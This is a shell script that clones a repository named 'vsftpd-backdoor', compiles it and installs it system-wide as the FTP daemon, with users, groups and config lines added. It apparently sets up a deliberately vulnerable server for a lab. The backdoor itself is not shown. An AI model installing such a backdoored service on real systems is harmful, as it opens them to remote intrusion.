#!/bin/sh

git clone https://github.com/lyndon160/vsftpd-backdoor.git
chmod -R 755 vsftpd-backdoor
cd vsftpd-backdoor

install -v -d -m 0755 /usr/share/vsftpd/empty
install -v -d -m 0755 /var/ftp/empty
install -v -d -m 0755 /home/ftp

groupadd -g 47 vsftpd
groupadd -g 48 ftp

useradd -c vsftpd_user -d /root -g vsftpd -s /bin/false -u 47 vsftpd
useradd -c anonymous_user -d /home/ftp -g ftp -s /bin/false -u 48 ftp

sed -i 's/lcrypt/lpam/g' Makefile
make

install -v -m 755 vsftpd /usr/sbin/vsftpd
install -v -m 644 vsftpd.8 /usr/share/man/man8
install -v -m 644 vsftpd.conf.5 /usr/share/man/man5
install -v -m 644 vsftpd.conf /etc

echo secure_chroot_dir=/root >> /etc/vsftpd.conf
echo pam_service_name=vsftpd >> /etc/vsftpd.conf

cd ..
rm -r vsftpd-backdoor

